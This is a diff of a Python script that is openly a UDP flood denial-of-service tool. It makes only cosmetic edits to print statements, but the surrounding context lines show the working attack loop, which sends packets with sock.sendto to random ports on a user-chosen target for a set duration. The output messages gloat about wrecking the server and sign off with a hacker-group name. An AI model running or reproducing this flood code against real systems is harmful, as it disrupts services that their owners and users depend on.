@@ -52,7 +52,7 @@ print("                   ======================================================
 time.sleep(0.7)
 print ""
 duration = input("                                   Duration (0 is infinite): ")
-print("                            Time duration of the attack ---> %s " % (duration) + color.END)
+print("                            Time duration of the attack ---> %s " % (duration))
 time.sleep(0.4)
 durclock = (lambda:0, time.clock)[duration > 0]
 duration = (1, (durclock() + duration))[duration > 0]
@@ -63,7 +63,7 @@ print ""
 print("               The UDP flood started on %s with %s bytes for %s seconds." % (target, package, duration))
 while True:
         if (durclock() < duration):
-                print("                            The Flood Attack is on, the server gonna be fucked up... ;) " + color.END)
+                print("                            The Flood Attack is on, the server gonna be fucked up... ;) ")
                 port = random.randint(1, 65535)
                 sock.sendto(packet, (target, port))
         else:
@@ -79,3 +79,4 @@ print "                                     << Remember The Infected Drake (TID)
 time.sleep(0.2)
 print "                                         Shutting down ... Goodbye ^_^ "
 print("              ==============================================================================")
+
